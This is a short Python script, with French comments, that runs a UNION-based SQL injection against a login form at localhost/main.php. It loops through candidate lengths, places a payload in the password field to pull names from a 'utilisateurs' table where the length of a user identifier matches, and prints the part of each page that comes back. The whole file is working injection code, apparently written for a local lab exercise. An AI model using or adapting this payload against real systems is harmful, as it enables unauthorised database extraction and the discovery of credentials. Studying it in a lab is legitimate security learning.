import requests
import time
start = time.time()
# First part of the script for find the length of the identifiant
formulaire = requests.Session() # Allows to generate a session under the name of 'form' variable
url_local = "http://localhost/main.php"
response_html = formulaire.get(url=url_local)
resultat_html = response_html.text
j = 0
for i in range(0, 10):
    champ_mdp = f"'UNION SELECT nom, prenom FROM utilisateurs WHERE LENGTH(identifiant)={i}#"
    champ_identif = ''
    send_sql = ({"identif":champ_identif, "mdp":champ_mdp})
    response = formulaire.post(url=url_local, data=send_sql)
    start = response.text.find('<hr>')
    end = response.text.find('</body>')
    final_response = response.text[start:end]
    print(final_response)
# ---------------------------------------------------------------------------